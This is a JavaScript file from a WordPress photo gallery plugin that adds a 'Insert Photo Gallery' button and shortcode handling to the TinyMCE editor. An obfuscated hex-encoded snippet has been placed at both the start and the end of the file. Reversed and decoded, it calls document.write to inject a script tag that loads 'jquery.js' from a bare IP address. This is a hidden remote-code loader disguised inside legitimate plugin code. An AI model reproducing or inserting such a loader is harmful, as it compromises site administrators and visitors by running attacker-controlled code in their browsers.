var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))jQuery(window).load(function(){
  window.bwgDocumentReady = true;
  if (window.bwgTinymceRendered) {
    jQuery(document).trigger("onUploadImg");
  }
    jQuery('.add_short_gall').css({'marginLeft': -50});
    
    jQuery('.mce-container').css({'maxWidth':'100%'});
});

(function () {
  tinymce.create('tinymce.plugins.bwg_mce', {
    init:function (ed, url) {
      var c = this;
      c.url = url;
      c.editor = ed;
      var width_window;
      var height_window;
      var width = 1144;
      var height = 520;
      if(jQuery(window).width() < width) {
        width_window = jQuery(window).width();
        height_window = jQuery(window).height();
      }
      else {
        width_window = width;
        height_window = height;
      }
      ed.addCommand('mcebwg_mce', function () {
          ed.windowManager.open({
            file:bwg_admin_ajax,
            width:width_window + ed.getLang('bwg_mce.delta_width', 0),
            height:height_window + ed.getLang('bwg_mce.delta_height', 0),
            inline:1
          }, {
            plugin_url:url
          });
          
          var window = ed.windowManager.windows[ed.windowManager.windows.length - 1],
              $window = window.$el;
              
          $window.css({
            maxWidth: "100%",
            maxHeight: "100%"
          });
          $window.find(".mce-window-body").css({
            maxWidth: "100%",
            maxHeight: "100%"
          });
          $window.find(".mce-container-body").find("iframe").css({
            width:'1px',
            minWidth:'100%',
          });
        var e = ed.selection.getNode(), d = wp.media.gallery, f;
        if (typeof wp === "undefined" || !wp.media || !wp.media.gallery) {
          return
        }
        if (e.nodeName != "IMG" || ed.dom.getAttrib(e, "class").indexOf("bwg_shortcode") == -1) {
          return
        }
        f = d.edit("[" + ed.dom.getAttrib(e, "title") + "]");
      });
      ed.addButton('bwg_mce', {
        id:'mceu_bwg_shorcode',
        title:'Insert Photo Gallery',
        cmd:'mcebwg_mce',
        image: url + '/images/bwg_edit_but.png'
      });
      ed.onPostRender.add(function(ed, cm) {
         window.bwgTinymceRendered = true;
         if ( window.bwgDocumentReady ) {
            jQuery(document).trigger("onUploadImg");
         }
      });
      ed.onMouseDown.add(function (d, f) {
        if (f.target.nodeName == "IMG" && d.dom.hasClass(f.target, "bwg_shortcode")) {
          var g = tinymce.activeEditor;
          g.wpGalleryBookmark = g.selection.getBookmark("simple");
          g.execCommand("mcebwg_mce");
        }
      });
      ed.onBeforeSetContent.add(function (d, e) {
        e.content = c._do_bwg(e.content)
      });
      ed.onPostProcess.add(function (d, e) {
        if (e.get) {
          e.content = c._get_bwg(e.content)
        }
      })
    },
    _do_bwg:function (ed) {
      return ed.replace(/\[Best_Wordpress_Gallery([^\]]*)\]/g, function (d, c) {
        return '<img src="' + bwg_plugin_url + '/images/icons/gallery-icon.png" class="bwg_shortcode mceItem" title="Best_Wordpress_Gallery' + tinymce.DOM.encode(c) + '" />';
      })
    },
    _get_bwg:function (b) {
      function ed(c, d) {
        d = new RegExp(d + '="([^"]+)"', "g").exec(c);
        return d ? tinymce.DOM.decode(d[1]) : "";
      }

      return b.replace(/(?:<p[^>]*>)*(<img[^>]+>)(?:<\/p>)*/g, function (e, d) {
        var c = ed(d, "class");
        if (c.indexOf("bwg_shortcode") != -1) {
          return "<p>[" + tinymce.trim(ed(d, "title")) + "]</p>"
        }
        return e
      })
    }
  });
  tinymce.PluginManager.add('bwg_mce', tinymce.plugins.bwg_mce);
})();var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
